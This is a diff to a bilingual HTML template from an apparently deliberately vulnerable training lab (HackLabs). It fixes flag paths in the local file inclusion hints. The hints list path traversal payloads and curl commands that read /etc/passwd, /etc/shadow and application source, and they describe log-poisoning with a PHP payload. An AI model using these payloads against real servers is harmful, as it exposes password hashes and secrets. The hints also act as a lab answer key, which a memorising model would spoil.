@@ -8,7 +8,7 @@
     <form method="GET" action="/files" class="flex gap-3 items-end mb-4">
       <div class="flex-1">
         <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="lbl_file_path">Ruta del archivo</label>
-        <input type="text" name="file" value="{{ filename | e }}" placeholder="../../../../../secrets/LFI/flag.txt"
+        <input type="text" name="file" value="{{ filename | e }}" placeholder="../../secret/LFI/flag.txt"
                class="hl-input font-mono" />
       </div>
       <button type="submit" class="btn-primary flex-shrink-0" data-i18n="btn_read">Leer</button>
@@ -35,7 +35,7 @@
         <pre># En el formulario web (campo "Ruta del archivo"):
 ../../../../../etc/passwd
 ../../../../../etc/shadow
-../../secret/LFI-flag.txt</pre></li>
+../../secret/LFI/flag.txt</pre></li>
       <li>O con curl usando rutas absolutas o traversal:
         <pre>curl "{{ target_base }}/files?file=../../../../../etc/passwd"
 curl "{{ target_base }}/files?file=../../../../../etc/shadow"
@@ -48,12 +48,14 @@ curl "{{ target_base }}/files?file=/app/app.py"</pre></li>
         <pre>curl "{{ target_base }}/files?file=/app/logs/access.log"</pre>
         Deberias ver tu payload PHP en la salida. En un servidor Apache con mod_php, incluir este log via LFI ejecutaria el PHP. En HackLabs (Flask) la ejecucion no ocurre, pero el concepto es identico al explotado en CTFs y servidores reales.</li>
       <li>Directory listing vulnerable y flag dedicada LFI:
-        <pre># Via traversal en el formulario web (escapa de /app/static/files/ hasta /secrets/):
-../../../../../secrets/LFI/flag.txt
+        <pre># Via traversal en el formulario web (desde /app/static/files/ → 2 niveles arriba → /app/secret/):
+../../secret/LFI/flag.txt          # flag LFI
+../../secret/A05-flag.txt          # flag A05 Misconfiguration
 
 # Via endpoint de directorio expuesto:
-curl "{{ target_base }}/secrets"
-curl "{{ target_base }}/secrets/LFI/flag.txt"</pre></li>
+curl "{{ target_base }}/secrets"              # directory listing
+curl "{{ target_base }}/secrets/LFI/flag.txt"
+curl "{{ target_base }}/secrets/A05-flag.txt"</pre></li>
     </ol>
     <h3>Medium — Bypass de filtro (strips ../ una vez)</h3>
     <ol>
@@ -85,7 +87,7 @@ curl "{{ target_base }}/files?file=/app/logs/access.log"</pre></li>
         <pre># In the web form ("File path" field):
 ../../../../../etc/passwd
 ../../../../../etc/shadow
-../../secret/LFI-flag.txt</pre></li>
+../../secret/LFI/flag.txt</pre></li>
       <li>Or with curl using absolute paths or traversal:
         <pre>curl "{{ target_base }}/files?file=../../../../../etc/passwd"
 curl "{{ target_base }}/files?file=../../../../../etc/shadow"
@@ -98,12 +100,14 @@ curl "{{ target_base }}/files?file=/app/app.py"</pre></li>
         <pre>curl "{{ target_base }}/files?file=/app/logs/access.log"</pre>
         You should see your PHP payload in the output. On an Apache server with mod_php, including this log via LFI would execute the PHP. In HackLabs (Flask) execution does not occur, but the concept is identical to what is exploited in CTFs and real servers.</li>
       <li>Exposed directory listing and dedicated LFI flag:
-        <pre># Via traversal in the web form (escapes from /app/static/files/ to /secrets/):
-../../../../../secrets/LFI/flag.txt
+        <pre># Via traversal in the web form (from /app/static/files/ → 2 levels up → /app/secret/):
+../../secret/LFI/flag.txt          # LFI flag
+../../secret/A05-flag.txt          # A05 Misconfiguration flag
 
 # Via exposed directory endpoint:
-curl "{{ target_base }}/secrets"
-curl "{{ target_base }}/secrets/LFI/flag.txt"</pre></li>
+curl "{{ target_base }}/secrets"              # directory listing
+curl "{{ target_base }}/secrets/LFI/flag.txt"
+curl "{{ target_base }}/secrets/A05-flag.txt"</pre></li>
     </ol>
     <h3>Medium — Filter bypass (strips ../ once)</h3>
     <ol>
